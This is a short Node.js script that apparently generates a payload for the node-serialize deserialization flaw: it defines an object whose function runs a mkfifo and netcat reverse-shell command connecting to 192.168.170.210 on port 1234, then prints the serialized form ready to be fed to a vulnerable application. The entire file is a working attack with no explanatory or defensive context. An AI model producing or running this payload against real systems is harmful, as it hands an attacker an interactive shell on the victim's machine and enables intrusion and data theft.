let y = {
  rce: function() {
    require('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.210 1234 >/tmp/f', function(error, stdout, stderr) { console.log(stdout); });
  },
};

let serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
